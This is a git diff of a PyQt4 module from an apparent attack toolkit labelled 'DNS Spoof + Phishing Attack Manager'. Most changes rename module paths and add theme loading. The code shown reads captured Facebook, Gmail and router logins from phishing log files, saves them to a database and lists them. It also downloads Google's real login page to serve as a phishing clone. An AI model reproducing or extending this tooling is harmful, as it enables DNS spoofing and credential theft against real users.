@@ -4,11 +4,12 @@ from PyQt4.QtCore import *
 import threading
 from os import system,getuid,popen,chdir,path ,getcwd,walk
 from time import sleep
-from Module.DHCPstarvation import frm_dhcp_Attack,conf_etter
-from Module.database import frm_datebase
-from Module.connection import *
+from Modules.DHCPstarvation import frm_dhcp_Attack,conf_etter
+from Modules.database import frm_datebase
+from Modules.connection import *
+from Core.Settings import frm_Settings
 from platform import linux_distribution
-from Module.AttackUp import frm_WinSoftUp
+from Modules.AttackUp import frm_WinSoftUp
 from re import compile,search
 from urllib2 import urlopen,URLError
 
@@ -18,11 +19,20 @@ class frm_dnsspoof(QMainWindow):
         super(frm_dnsspoof, self).__init__(parent)
         self.form_widget = frm_dnsAttack(self)
         self.setCentralWidget(self.form_widget)
-        sshFile="Core/dark_style.css"
-        with open(sshFile,"r") as fh:
-            self.setStyleSheet(fh.read())
         self.setWindowTitle("DNS Spoof + Phishing Attack Manager")
         self.setWindowIcon(QIcon('rsc/icon.ico'))
+        self.config = frm_Settings()
+        self.loadtheme(self.config.XmlThemeSelected())
+
+    def loadtheme(self,theme):
+        if theme != "theme2":
+            sshFile=("Core/%s.css"%(theme))
+            with open(sshFile,"r") as fh:
+                self.setStyleSheet(fh.read())
+        else:
+            sshFile=("Core/%s.css"%(theme))
+            with open(sshFile,"r") as fh:
+                self.setStyleSheet(fh.read())
 
     def closeEvent(self, event):
         reply = QMessageBox.question(self, 'About DNS SPOOF',"Are you sure to quit the DNS spoof Attack?", QMessageBox.Yes |
@@ -140,9 +150,9 @@ class frm_dnsAttack(QWidget):
     def savedb_checkbox_func(self):
         if self.cb_db.isChecked():
             if self.rb_face.isChecked():
-                log = open("Module/Phishing/Facebook/log.txt", "r")
+                log = open("Modules/Phishing/Facebook/log.txt", "r")
                 if len(log.read()) > 0:
-                    log = open("Module/Phishing/Facebook/log.txt", "r")
+                    log = open("Modules/Phishing/Facebook/log.txt", "r")
                     for i,j in enumerate(log.readlines()):
                         s = j.split("-")
                         add_Face_db(str(s[0]), str(s[1]))
@@ -153,9 +163,9 @@ class frm_dnsAttack(QWidget):
                     self.cb_db.setChecked(False)
 
             elif self.rb_gmail.isChecked():
-                log = open("Module/Phishing/Gmail/log.txt", "r")
+                log = open("Modules/Phishing/Gmail/log.txt", "r")
                 if len(log.read()) > 0:
-                    log = open("Module/Phishing/Gmail/log.txt", "r")
+                    log = open("Modules/Phishing/Gmail/log.txt", "r")
                     for i,j in enumerate(log.readlines()):
                         s = j.split("-")
                         add_gmail_db(s[0], s[1])
@@ -165,9 +175,9 @@ class frm_dnsAttack(QWidget):
                 if self.cb_db.isChecked():
                     self.cb_db.setChecked(False)
             elif self.rb_route.isChecked():
-                log = open("Module/Phishing/Route/log.txt", "r")
+                log = open("Modules/Phishing/Route/log.txt", "r")
                 if len(log.read()) > 0:
-                    log = open("Module/Phishing/Route/log.txt", "r")
+                    log = open("Modules/Phishing/Route/log.txt", "r")
                     for i,j in enumerate(log.readlines()):
                         s = j.split("-")
                         add_Route_db(s[0], s[1])
@@ -207,7 +217,7 @@ class frm_dnsAttack(QWidget):
             self.box_login.clear()
             logins = []
             chdir(self.owd)
-            log = open("Module/Phishing/Facebook/log.txt", "r")
+            log = open("Modules/Phishing/Facebook/log.txt", "r")
             self.box_login.append("=================== Facebook Logins =====================")
             for i,j in enumerate(log.readlines()):
                 logins.append(i)
@@ -220,7 +230,7 @@ class frm_dnsAttack(QWidget):
             logins = []
             chdir(self.owd)
             self.box_login.append("=================== Gmail Logins =====================")
-            log = open("Module/Phishing/Gmail/log.txt", "r")
+            log = open("Modules/Phishing/Gmail/log.txt", "r")
             for i,j in enumerate(log.readlines()):
                 logins.append(i)
                 s = j.split("-")
@@ -232,7 +242,7 @@ class frm_dnsAttack(QWidget):
             logins = []
             chdir(self.owd)
             self.box_login.append("=================== Router Logins =====================")
-            log = open("Module/Phishing/Route/log.txt", "r")
+            log = open("Modules/Phishing/Route/log.txt", "r")
             for i,j in enumerate(log.readlines()):
                 logins.append(i)
                 s = j.split("-")
@@ -374,7 +384,7 @@ class frm_dnsAttack(QWidget):
         self.boxlog.clear()
         type_phishing = None
         if sock != None and sock != 1:
-            path = "Module/Phishing/Facebook/"
+            path = "Modules/Phishing/Facebook/"
             try:
                 chdir(path)
             except OSError,e:
@@ -387,12 +397,12 @@ class frm_dnsAttack(QWidget):
             face_page.close()
             type_phishing = "Facebook"
         elif sock == 1 and sock != None:
-            path = "Module/Phishing/Route/"
+            path = "Modules/Phishing/Route/"
             chdir(path)
             type_phishing = "Route"
-            self.boxlog.addItem("[+] Path page:/Module/Phishing/Route")
+            self.boxlog.addItem("[+] Path page:/Modules/Phishing/Route")
         else:
-            path = "Module/Phishing/Gmail/"
+            path = "Modules/Phishing/Gmail/"
             try:
                 chdir(path)
                 request = urlopen('http://accounts.google.com/Login?hl').read()
@@ -404,7 +414,7 @@ class frm_dnsAttack(QWidget):
             except OSError,e:
                 return None
             type_phishing = "Gmail"
-            self.boxlog.addItem("[+] Path page:/Module/Phishing/Gmail")
+            self.boxlog.addItem("[+] Path page:/Modules/Phishing/Gmail")
 
         self.boxlog.addItem("[+] Set Path %s Phishing"%(type_phishing))
         self.boxlog.addItem("[+] Get IP Local")
